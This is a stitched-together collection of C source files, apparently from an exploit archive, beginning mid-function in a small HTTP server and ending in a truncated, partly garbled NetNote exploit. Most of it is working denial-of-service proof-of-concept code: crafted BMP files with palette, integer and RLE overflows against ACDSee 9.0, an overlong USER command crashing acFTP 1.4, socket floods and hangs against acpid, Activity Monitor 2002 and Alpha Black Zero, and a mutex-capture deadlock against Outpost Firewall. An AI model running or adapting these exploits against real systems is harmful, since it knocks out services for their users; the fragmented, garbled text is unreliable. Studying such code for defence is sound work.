  char *myenviron[100];
  extern char **environ;
  environ = myenviron;

  if (argc == 1)
    print_usage ();
  else
    {
      if ((argc - 1) % 2)
	print_usage ();
      i = 1;
      while (i < argc)
	{
	  if (argv[i][0] != '-')
	    print_usage ();
	  switch (argv[i][1])
	    {
	    case 'p':
	      if ((i + 1) >= argc)
		print_usage ();
	      if (!(k = atoi (argv[i + 1])))
		print_usage ();
	      server_port = k;
	      break;
	    case 'r':
	      if ((i + 1) >= argc)
		print_usage ();
	      root_dir = argv[i + 1];
	      break;
	    default:
	      print_usage ();
	    }
	  i += 2;
	}
      if (chdir (root_dir))
	printf ("Can't change to directory %s!\n", root_dir);
    }

  setenv ("SERVER_SOFTWARE", "FleaHttpd/0.0.1", 1);
  setenv ("GATEWAY_INTERFACE", "CGI/1.1", 1);
  setenv ("SERVER_PROTOCOL", "HTTP/1.1", 1);
  setenv ("SERVER_NAME", "localhost", 1);
  sprintf (server_port_c, "%d", server_port);
  setenv ("SERVER_PORT", server_port_c, 1);


  int content_type = 0;		//0 plain, 1 html, 2 jpeg, 3 png, 4 gif, 5 css, 6 bmp, 7 cgi
  char header_0[] =
    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n";
  char header_1[] =
    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n";
  char header_2[] =
    "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n";
  char header_3[] =
    "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\nConnection: close\r\n\r\n";
  char header_4[] =
    "HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nConnection: close\r\n\r\n";
  char header_5[] =
    "HTTP/1.1 200 OK\r\nContent-Type: text/css\r\nConnection: close\r\n\r\n";
  char header_6[] =
    "HTTP/1.1 200 OK\r\nContent-Type: image/bmp\r\nConnection: close\r\n\r\n";
  char header_7[] = "HTTP/1.1 200 OK\r\n";
  char *header[] =
    { header_0, header_1, header_2, header_3, header_4, header_5, header_6,
    header_7
  };
  char header_notfound[] =
    "HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\n\r\n";
  int header_len_404 = strlen (header_notfound);
  int header_len[8];
  for (i = 0; i < 8; i++)
    header_len[i] = strlen (header[i]);

  char *default_page = malloc (DEFAULT_PAGE_LEN_LIMIT);
  char buildin_default_page[] = "<h2>FleaHttpd is online!</h2>";
  char *page_404 = malloc (DEFAULT_PAGE_LEN_LIMIT);
  char buildin_page_404[] = "<h2>404</h2>\nThe page cannot be found.";
  char *page = malloc (PAGE_LEN_LIMIT);
  FILE *fp, *fp1;
  if (!(fp = fopen ("index.html", "r")))
    {
      free (default_page);
      default_page = buildin_default_page;
      default_page_len = strlen (buildin_default_page);
    }
  else
    {
      memcpy (default_page, header[1], header_len[1]);
      default_page_len =
	header_len[1] + fread (default_page + header_len[1], 1,
			       DEFAULT_PAGE_LEN_LIMIT, fp);
      if (default_page_len == 0 || default_page_len >= DEFAULT_PAGE_LEN_LIMIT)
	{
	  printf ("Size of index.html is illegal! sizeof(file) = %d\n",
		  default_page_len);
	  return ERROR;
	}
      fclose (fp);
    }
  if (!(fp = fopen ("404.html", "r")))
    {
      free (page_404);
      page_404 = buildin_page_404;
      page_404_len = strlen (buildin_page_404);
    }
  else
    {
      memcpy (page_404, header_notfound, header_len_404);
      page_404_len =
	header_len_404 + fread (page_404 + header_len_404, 1,
				DEFAULT_PAGE_LEN_LIMIT, fp);
      if (page_404_len == 0 || page_404_len >= DEFAULT_PAGE_LEN_LIMIT)
	{
	  printf ("Size of 404.html is illegal! sizeof(file) = %d\n",
		  page_404_len);
	  return ERROR;
	}
      fclose (fp);
    }

  sd = socket (AF_INET, SOCK_STREAM, 0);
  if (sd < 0)
    {
      printf ("Can't open socket!\n");
      return ERROR;
    }
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = htonl (INADDR_ANY);
  servAddr.sin_port = htons (server_port);
  if (bind (sd, (struct sockaddr *) &servAddr, sizeof (servAddr)) < 0)
    {
      printf ("Can't bind port %d!\n", server_port);
      return ERROR;
    }
  listen (sd, 1000);

  while (1)
    {
      cliLen = sizeof (cliAddr);
      newSd = accept (sd, (struct sockaddr *) &cliAddr, &cliLen);
      if (newSd < 0)
	{
	  continue;
	}
      pos = message;
      content_length = 0;
      *filename = 0;
      use_default = 0;
      use_404 = 1;
      content_type = 0;
      http_method = 3;
      script_query[0] = 0;
      script_query_len = 0;
      while ((n = readline (newSd, line, MAX_MSG, 0)) > 0)
	{
	  if (line[n - 2] == '\r')
	    {
	      n = n - 2;
	      line[n] = 0;
	    }
	  if (n == 0)
	    break;

	  switch (*line)
	    {
	    case 'G':
	      if (line[1] == 'E')
		http_method = 0;
	    case 'P':
	      if (line[1] == 'O')
		http_method = 1;
	      else if (line[1] == 'U')
		http_method = 2;

	      for (pi = line + (http_method == 1 ? 5 : 4);
		   (*pi) == '.' && (*pi) == '/'; pi++);
	      pi++;
	      script_name[0] = '/';
	      for (i = 0; pi[i] != ' ' && pi[i] != '?'; i++)
		{
		  filename[i] = pi[i];
		  script_name[i + 1] = pi[i];
		}
	      if (!i)
		{
		  use_default = 1;
		  break;
		}
	      filename[i] = 0;
	      script_name[i + 1] = 0;
	      if (pi[i] == '?')
		{
		  for (i += 1; pi[i] != ' '; i += 1)
		    {
		      script_query[script_query_len] = pi[i];
		      script_query_len++;
		    }
		  script_query[script_query_len] = 0;
		}

	      for (j = i - 1;
		   j >= 0 && filename[j] != '/' && filename[j] != '.'; j--);
	      if (filename[j] == '.')
		{
		  j++;
		  if (filename[j] == 'h' && filename[j + 1] == 't'
		      && filename[j + 2] == 'm' && filename[j + 3] == 'l')
		    content_type = 1;
		  else if (filename[j] == 'H' && filename[j + 1] == 'T'
			   && filename[j + 2] == 'M'
			   && filename[j + 3] == 'L')
		    content_type = 1;
		  else if (filename[j] == 'j' && filename[j + 1] == 'p'
			   && filename[j + 2] == 'g')
		    content_type = 2;
		  else if (filename[j] == 'J' && filename[j + 1] == 'P'
			   && filename[j + 2] == 'G')
		    content_type = 2;
		  else if (filename[j] == 'j' && filename[j + 1] == 'p'
			   && filename[j + 2] == 'e'
			   && filename[j + 3] == 'g')
		    content_type = 2;
		  else if (filename[j] == 'J' && filename[j + 1] == 'P'
			   && filename[j + 2] == 'E'
			   && filename[j + 3] == 'G')
		    content_type = 2;
		  else if (filename[j] == 'p' && filename[j + 1] == 'n'
			   && filename[j + 2] == 'g')
		    content_type = 3;
		  else if (filename[j] == 'P' && filename[j + 1] == 'N'
			   && filename[j + 2] == 'G')
		    content_type = 3;
		  else if (filename[j] == 'g' && filename[j + 1] == 'i'
			   && filename[j + 2] == 'f')
		    content_type = 4;
		  else if (filename[j] == 'G' && filename[j + 1] == 'I'
			   && filename[j + 2] == 'F')
		    content_type = 4;
		  else if (filename[j] == 'c' && filename[j + 1] == 's'
			   && filename[j + 2] == 's')
		    content_type = 5;
		  else if (filename[j] == 'C' && filename[j + 1] == 'S'
			   && filename[j + 2] == 'S')
		    content_type = 5;
		  else if (filename[j] == 'b' && filename[j + 1] == 'm'
			   && filename[j + 2] == 'p')
		    content_type = 6;
		  else if (filename[j] == 'B' && filename[j + 1] == 'M'
			   && filename[j + 2] == 'P')
		    content_type = 6;
		  else if (filename[j] == 'c' && filename[j + 1] == 'g'
			   && filename[j + 2] == 'i')
		    content_type = 7;
		  else if (filename[j] == 'C' && filename[j + 1] == 'G'
			   && filename[j + 2] == 'I')
		    content_type = 7;
		}
	      use_default = 0;
	      use_404 = 0;

	      break;
	    default:
	      break;
	    }
	  if (http_method == 1 && *line == 'C' && line[7] == '-'
	      && line[8] == 'L')
	    content_length = atoi (line + 16);
	}

      if (http_method == 1 && content_length)
	{
	  n = readline (newSd, line, MAX_MSG, 1);
	  if (n)
	    {
	      n--;
	      if (n != content_length)
		{
		  close (newSd);
		  continue;
		}
	      line[n] = 0;
	      if (script_query_len)
		{
		  script_query[script_query_len] = '&';
		  script_query_len++;
		}
	      for (i = 0; i < n; i += 1)
		{
		  script_query[script_query_len] = line[i];
		  script_query_len++;
		}
	      script_query[script_query_len] = 0;
	    }
	}
      if (support_cgi && script_query_len)
	setenv ("QUERY_STRING", script_query, 1);
      else
	unsetenv ("QUERY_STRING");

      if (!use_default && http_method < 3)
	{
	  if (support_cgi && content_type == 7)	//CGI
	    {
	      if (pipe (p) < 0 || !(fp1 = fopen (filename, "r")))
		{
		  use_default = 0;
		  use_404 = 1;
		}
	      else
		{
		  fclose (fp1);
		  if ((pid = fork ()), pid == 0)
		    {
		      setenv ("REQUEST_METHOD", "GET", 1);
		      setenv ("SCRIPT_NAME", script_name, 1);
		      setenv ("REMOTE_ADDR", inet_ntoa (cliAddr.sin_addr), 1);
		      close (1);
		      dup (p[1]);
		      close (p[0]);
		      close (p[1]);
		      if (execl (filename, filename, NULL))
			exit (0);
		    }
		  close (p[1]);
		  if (!(ptr = fdopen (p[0], "r")))
		    {
		      use_default = 0;
		      use_404 = 1;
		    }
		  else
		    {
		      memcpy (page, header[content_type],
			      header_len[content_type]);
		      page_len =
			header_len[content_type] + fread (page +
							  header_len
							  [content_type], 1,
							  PAGE_LEN_LIMIT,
							  ptr);
		      fclose (ptr);
		      use_default = 0;
		      use_404 = 0;
		    }
		}
	    }
	  else
	    {
	      if (!(fp = fopen (filename, "r")))
		{
		  use_default = 0;
		  use_404 = 1;
		}
	      else
		{
		  memcpy (page, header[content_type],
			  header_len[content_type]);
		  page_len =
		    header_len[content_type] + fread (page +
						      header_len
						      [content_type], 1,
						      PAGE_LEN_LIMIT, fp);
		  if (page_len == 0 || page_len == PAGE_LEN_LIMIT)
		    {
		      use_default = 0;
		      use_404 = 1;
		    }
		  else
		    {
		      use_default = 0;
		      use_404 = 0;
		      fclose (fp);
		    }
		}
	    }
	}

      if (use_default)
	send (newSd, default_page, default_page_len, 0);
      else if (use_404)
	send (newSd, page_404, page_404_len, 0);
      else
	send (newSd, page, page_len, 0);
      close (newSd);
    }
  free (message);
  free (default_page);
  free (page);
  free (page_404);
  close (sd);

  return 0;
}

inline int
readline (int fd, char *bufptr, size_t len, int flush)
{
  char *bufx = bufptr;
  static char *bp;
  static int cnt = 0;
  static char b[MSG_LEN_LIMIT];
  char c;
  int r_l;

  if (flush && cnt > 0)
    {
      r_l = cnt > len ? len : cnt;
      memcpy (bufptr, bp, r_l);
      cnt -= r_l;
      return r_l;
    }

  while (--len > 0)
    {
      if (--cnt <= 0)
	{
	  cnt = recv (fd, b, sizeof (b), 0);
	  if (cnt < 0)
	    return -1;
	  if (cnt == 0)
	    return 0;
	  bp = b;
	}
      c = *bp++;
      *bufptr++ = c;
      if (c == '\n')
	{
	  *bufptr = '\0';
	  return bufptr - bufx;
	}
    }
  return -1;
}

inline void
print_usage ()
{
  printf
    ("Usage: \n\tfleahttpd -p port -r wwwroot\nExample: \n\tfleahttpd -p 80 -r /var/www/fleahttpd\n");
  exit (0);
}
source: http://www.securityfocus.com/bid/23317/info

ACDSee 9.0 Photo Manager is prone to multiple denial-of-service vulnerabilities because the application fails to properly handle malformed BMP image files.

Successfully exploiting these issues allows attackers to crash the affected application. Due to the nature of the issues, code execution may also be possible, but this has not been confirmed.

Version 9.0 of the application is affected; other versions may also be vulnerable. 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


struct BITMAPFILEHEADER {
unsigned int bfSize;
unsigned int bfReserved;
unsigned int bfOffBits;
};

struct BITMAPINFOHEADER {
unsigned int biSize;
unsigned int biWidth;
unsigned int biHeight;
unsigned short biPlanes;
unsigned short biBitCount;
unsigned int biCompression;
unsigned int biSizeImage;
unsigned int biXPelsPerMeter;
unsigned int biYPelsPerMeter;
unsigned int biClrUsed;
unsigned int biClrImportant;
};

void writebmp(char *filename, unsigned long width, unsigned long height, unsigned int bpp, unsigned int compression, unsigned char *palette, long numpalettecolors, unsigned char *data, long numdatabytes) {
BITMAPFILEHEADER fileheader;
BITMAPINFOHEADER infoheader;

memset(&fileheader,0,sizeof(BITMAPFILEHEADER));
memset(&infoheader,0,sizeof(BITMAPINFOHEADER));

unsigned char sig[2];
sig[0] = 'B';
sig[1] = 'M';

fileheader.bfSize = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4+numdatabytes;
fileheader.bfOffBits = sizeof(sig)+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+numpalettecolors*4;

infoheader.biSize = 40;
infoheader.biWidth = width;
infoheader.biHeight = height;
infoheader.biPlanes = 1;
infoheader.biBitCount = bpp;
infoheader.biCompression = compression;
infoheader.biClrUsed = numpalettecolors;

FILE *fp = fopen(filename,"wb");
fwrite(&sig,sizeof(sig),1,fp);
fwrite(&fileheader,sizeof(BITMAPFILEHEADER),1,fp);
fwrite(&infoheader,sizeof(BITMAPINFOHEADER),1,fp);
if(palette) fwrite(palette,numpalettecolors*4,1,fp);
fwrite(data,numdatabytes,1,fp);
fclose(fp);
}

int main() {
unsigned char * buf;
buf = (unsigned char *)malloc(4000000);
memset(buf,0,4000000);
unsigned char * buf2;
buf2 = (unsigned char *)malloc(4000000);
memset(buf2,0,4000000);

//overflows specifying too large palette
writebmp("ok8bit.bmp",16,16,8,0,buf,256,buf,16*16);
writebmp("paletteof1.bmp",16,16,8,0,buf,65535,buf,16*16);
writebmp("paletteof2.bmp",16,16,8,0,buf,1000000,buf,16*16);

//integer overflows with image dimensions
writebmp("ok24bit.bmp",16,16,24,0,NULL,0,buf,16*16*4);
writebmp("wh4intof.bmp",32769,32768,24,0,NULL,0,buf,4000000);
writebmp("wh3intof.bmp",37838,37838,24,0,NULL,0,buf,4000000);
writebmp("w4intof.bmp",1073741825,1,24,0,NULL,0,buf,4000000);
writebmp("w3intof.bmp",1431655767,1,24,0,NULL,0,buf,4000000);

//overflows with RLE encoded BMPs
buf2[0]=16;
buf2[1]=0;
writebmp("okRLE.bmp",16,1,8,1,buf,256,buf2,2);
for(long i=0;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of1.bmp",16,1,8,1,buf,256,buf2,1000000);
buf2[0]=15;
buf2[1]=0;
for(long i=1;i<500000;i++) {
buf2[i*2]=255;
buf2[i*2+1]=0;
}
writebmp("rle8of2.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
buf2[0]=0;
buf2[1]=2;
buf2[2]=255;
buf2[3]=0;
for(long i=4;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of3.bmp",16,1,8,1,buf,256,buf2,1000000);
memset(buf2,0,4000000);
for(long i=0;i<100000-1;) {
buf2[i]=0;
buf2[i+1]=254;
i+=255;
}
writebmp("rle8of4.bmp",16,1,8,1,buf,256,buf2,1000000);
} 
/**
Exploit for : acFTP 1.4 DoS Exploit
Advisory : http://secunia.com/advisories/19978/
Coder : Omnipresent
Email : omnipresent@email.it
Description : Preddy has discovered a vulnerability in acFTP, which can be exploited by malicious people to cause a DoS (Denial of Service).
The vulnerability is caused due to an error within the handling of the argument passed to the 
"USER" command. This can be exploited to crash the FTP server via an overly long argument that 
contains certain character sequences.

The vulnerability has been confirmed in version 1.4. Other versions may also be affected.

Date: 05/06/2006 - M/D/Y
**/

#ifdef _WIN32
#include <winsock2.h>

SOCKET sock;
WSADATA wsaData;
WORD wVersionRequested;

#else
#include <sys/socket.h>
#include <netinet/in.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1

int sock;
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
char buf[2505];
struct sockaddr_in saddr;
unsigned long ip;
int i;

if (argc != 2)
{
printf("acFTP 1.4 USER Command - DoS Exploit!\r\n");
printf("Coded by OmniPresent - omnipresent@email.it\r\n");
printf("acFTP 1.4 - DoS Exploit!rn");
printf("Advisory: http://secunia.com/advisories/19978/");
printf("%s <IP_Address>\r\n", argv[0]);

exit(1);
}

ip = inet_addr(argv[1]);

#ifdef _WIN32
wVersionRequested = MAKEWORD(2, 2);
if (WSAStartup(wVersionRequested, &wsaData) < 0)
{
printf("Unable to initialise Winsockr\n");
exit(1);
}
#endif


if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
{
printf("Socket Error \n");
exit(1);
}


memset(&saddr,'0', sizeof(saddr));
saddr.sin_port = htons(21); //21 is the default port of acFTP service (change it if necessary)
saddr.sin_family = AF_INET;
memcpy(&saddr.sin_addr, (unsigned long *)&ip, sizeof((unsigned long *)&ip));

if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR)
{
printf("Connect Error \n");
exit(1);
}

sleep(2); 
    
    buf[0]='U';
    buf[1]='S';
    buf[2]='E';
    buf[3]='R';
    buf[4]=' ';
    i = 5;
while (i < 2500) {

buf[i] = 'A';
i++;
buf[i] = '{';
i++;
}
strcat(buf, "\r\n");

printf("%s\n",buf);


send(sock, buf, sizeof(buf), 0);

#ifdef _WIN32
closesocket(sock);
#else
close(sock);
#endif
printf("DoS Attack Done!\n");
}

// milw0rm.com [2006-05-06]
source: http://www.securityfocus.com/bid/45915/info

The 'acpid' daemon is prone to multiple local denial-of-service vulnerabilities.

Successful exploits will allow attackers to cause the application to hang, denying service to legitimate users.

acpid 1.0.10 is vulnerable; other versions may also be affected.

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <errno.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>

/* Tested on acpid-1.0.10 (Ubuntu 10.04) */

int ud_connect(const char *name)
{
	int fd;
	int r;
	struct sockaddr_un addr;

	fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return fd;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	sprintf(addr.sun_path, "%s", name);

	r = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
	if (r < 0) {
		perror("connect");
		close(fd);
		return r;
	}

	return fd;
}

int main(int argc, char *argv[])
{
	int fd;
	char c;

	if (argc != 2) {
		fprintf(stderr, "Usage: prog fname\n");
		exit(1);
	}

	fd = ud_connect(argv[1]);
	if (fd < 0)
		exit(1);
	printf("\"Hanging\" socket opened, fd = %d\n", fd);

	fd = ud_connect(argv[1]);
	if (fd < 0)
		exit(1);
	printf("Normal socket opened, fd = %d\n", fd);

	while (1) {
		static int n;
		read(fd, &c, 1);
		fflush(stdout);
		if (c == '\n') {
			printf("%d messages in queue\n", ++n);
		}
	}
}

source: http://www.securityfocus.com/bid/7748/info

A vulnerability has been reported for Activity Monitor 2002 that may be exploited to remotely trigger a denial of service condition. The problem occurs while handling data received from hosts that are not registered in the Activity Monitor 'monitoring list'.

A remote attacker may exploit this vulnerability to crash a remote Activity Monitor service, effectively triggering a persistent denial of service condition.

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>



int main(int argc, char **argv)
{

  int i,ck,port,sd;
  char dos[10000];

  struct sockaddr_in act_mon_server;

  if(argc < 2)
  {
    printf("\nUsage: %s <ip>\n", argv[0]);
    exit(0);
  }

  port = 15163;

  for(i = 0; i < 10000; i++) dos[i] = 'x';

  act_mon_server.sin_family = AF_INET;
  act_mon_server.sin_port = htons((u_short)port);
  act_mon_server.sin_addr.s_addr = (long)inet_addr(argv[1]);

  sd = socket(AF_INET, SOCK_STREAM, 0);

  ck = connect(sd, (struct sockaddr *) &act_mon_server, sizeof
(act_mon_server));

  if(ck != 0) {
    perror("Connect");
    exit(0);
    }

  printf("\n\t\tProof of Concept Activity Monitor 2002 DoS\n");
  printf("\t\tby Luca Ercoli luca.ercoli@inwind.it\n\n");

  write(sd, dos, sizeof(dos));
  write(sd, dos, sizeof(dos));
  write(sd, dos, sizeof(dos));

  printf("\nDoS sent!\n");

  close(sd);

  exit(0);
}

source: http://www.securityfocus.com/bid/24284/info

Outpost Firewall is prone to a local denial-of-service vulnerability.

An attacker can exploit this issue to block arbitrary processes, denying service to legitimate users.

This issue affects Outpost Firewall 4.0 build 1007.591.145 and build 964.582.059; other versions may also be affected. 

/*

 Testing program for Enforcing system reboot with \"outpost_ipc_hdr\" mutex (BTP00002P004AO)
 

 Usage:
 prog
   (the program is executed without special arguments)

 Description:
 This program calls standard Windows API to open and capture mutex. Then an attempt to create a child process 
 causes the deadlock. To terminate this testing program and to release the mutex press Ctrl+C.

 Test:
 Running the testing program.

*/

#include <stdio.h>
#include <windows.h>
#include <ddk/ntapi.h>

void about(void)
{
  printf("Testing program for Enforcing system reboot with \"outpost_ipc_hdr\" mutex (BTP00002P004AO)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test\n"
         "  (the program is executed without special arguments)\n");
  return;
}


void print_last_error()
{
  LPTSTR buf;
  DWORD code=GetLastError();
  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
  {
    fprintf(stderr,"Error code: %ld\n",code);
    fprintf(stderr,"Error message: %s",buf);
    LocalFree(buf);
  } else fprintf(stderr,"Unable to format error message for code %ld.\n",code);
  return;
}


HANDLE capture_mutex(char *name)
{
  wchar_t namew[MAX_PATH];
  snwprintf(namew,MAX_PATH,L"%S",name);
  UNICODE_STRING uniname;
  RtlInitUnicodeString(&uniname,namew);

  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa,&uniname,OBJ_CASE_INSENSITIVE | OBJ_OPENIF,0,NULL);
  HANDLE mutex;
  DWORD access=MUTANT_ALL_ACCESS;
  NTSTATUS status=ZwOpenMutant(&mutex,access,&oa);
  if (!NT_SUCCESS(status)) return 0;
  printf("Mutex opened.\n");
  if (WaitForSingleObject(mutex,5000)==WAIT_OBJECT_0) return mutex;
  ZwClose(mutex);
  return NULL;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=1)
  {
    usage();
    return 1;
  }

  while (1)
  {
    HANDLE mutex=capture_mutex("\\BaseNamedObjects\\outpost_ipc_hdr");
    if (mutex)
    {
      printf("Mutex captured.\n"
             "Running system shell. This action will block the system.\n");

      WinExec("cmd",SW_NORMAL);
    } else
    {
      fprintf(stderr,"Unable to capture \"outpost_ipc_hdr\" mutex.\n");
      break;
    }
  }

  printf("\nTEST FAILED!\n");
  return 1;
}
                                  
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}




    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    29850
#define TIMEOUT 3
#define MAX     16
#define INFO    "\\status\\"
#define PCK     "\x2e\x00\x00\x00\x00\x00\x2f\x2f\x01\x00\x00\x00\x41"
                // this is a normal join packet, nothing of strange



void show_info(u_char *buff);
u_long resolv(char *host);
int timeout(int sock);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i;
    u_short     port = PORT;
    u_char      buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs("\n"
        "Alpha Black Zero <= 1.04 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(argv[1]);
    peer.sin_port         = htons(port + 1);
    peer.sin_family       = AF_INET;

    printf("- target %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    printf("- request informations to the query port %d\n", port + 1);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();
    if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nAlert: socket timeout, no information reply received but I continue\n", stdout);
    } else {
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          < 0) std_err();
        show_info(buff);
    }
    close(sd);

    peer.sin_port         = htons(port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();

    fputs("- start attack\n", stdout);
    for(i = 0; i < MAX; i++) {
        fputs("  player: ", stdout);
        if(sendto(sd, PCK, sizeof(PCK) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputc('.', stdout);

        if(timeout(sd) < 0) break;  // packet 1
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          < 0) std_err();
        fputc('.', stdout);

        if(timeout(sd) < 0) break;  // packet 2
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          < 0) std_err();
        fputc('.', stdout);
        fputc('\n', stdout);
    }

    close(sd);

    if(i && (i <= MAX)) {
        fputs("\n\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\n\nServer doesn't seem vulnerable\n\n", stdout);
    }

    return(0);
}



void show_info(u_char *data) {
    int     nt = 1;
    u_char  *p;

    while((p = strchr(data, '\\'))) {
        *p = 0x00;
        if(!nt) {
            printf("%30s: ", data);
            nt++;
        } else {
            printf("%s\n", data);
            nt = 0;
        }
        data = p + 1;
    }
    printf("%s\n", data);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



// milw0rm.com [2004-03-03]
source: http://www.securityfocus.com/bid/11677/info

NetNote server is reported prone to a remote denial of service vulnerability. This issue occurs because the application does not handle exceptional conditions properly.

NetNote server 2.2 build 230 is reported vulnerable to this issue, however, it is likely that other versions are affected as well.

*/
�
#include "winsock2.h"
#include "fstream.h"
�
#pragma comment(lib, "ws2_32")
�

static char payload[100];
�
char crash[]="\x90\x90\x90\x90\x20\x20\x20\x20";
�
void usage(char* us);
WSADATA wsadata;
void ver();
�
int main(int argc,char *argv[])
{
�ver();
�if ((argc<3)||(argc>4)||(atoi(argv[1])<1)||(atoi(argv[1])>1)){usage(argv[0]);return -1;}
